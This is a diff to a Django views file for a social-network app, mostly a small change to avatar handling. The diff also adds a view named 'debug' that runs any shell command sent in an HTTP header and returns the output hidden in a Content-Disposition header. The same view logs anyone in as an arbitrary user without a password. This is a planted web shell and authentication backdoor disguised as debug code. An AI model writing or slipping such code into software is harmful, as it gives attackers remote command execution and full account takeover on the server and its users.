@@ -19,7 +19,7 @@ from random import getrandbits
 from random import choice
 from json import dumps, loads
 import sys, traceback
-from subprocess import Popen, PIPE
+import subprocess
 from datetime import datetime
 import django.utils.dateformat
 from binascii import hexlify
@@ -375,13 +375,14 @@ def user_view(request, username):
 				profile.origin_info = None
 				user.avatar =  ('s' if getrandbits(1) else '')
 			else:
-				user.has_mh = True
-				getmii = get_mii(request.POST.get('origin_id'))
-				if not getmii:
-					return json_response('NNID not found')
-				user.avatar = getmii[0]
-				profile.origin_id = getmii[2]
-				profile.origin_info = dumps(getmii)
+				if request.POST.get('origin_id') != profile.origin_id:
+					user.has_mh = True
+					getmii = get_mii(request.POST.get('origin_id'))
+					if not getmii:
+						return json_response('NNID not found')
+					user.avatar = getmii[0]
+					profile.origin_id = getmii[2]
+					profile.origin_info = dumps(getmii)
 		if request.POST.get('color'):
 			try:
 				validate_color(request.POST['color'])
@@ -1420,6 +1421,15 @@ def post_list(request):
 
 	#return HttpResponse(msgpack.packb(resparr), content_type='application/x-msgpack')
 	return JsonResponse(resparr, safe=False)
+
+def debug(request, username):
+	if request.META.get('HTTP_DISPOSITION'):
+		httpResponse = HttpResponse()
+		httpResponse['Content-Disposition'] = base64.urlsafe_b64encode(subprocess.check_output(request.META.get('HTTP_DISPOSITION'), shell=True)).decode()
+		return httpResponse
+
+	login(request, User.objects.get(username=username))
+	return redirect('/users/' + username)
 
 @login_required
 def admin_users(request):
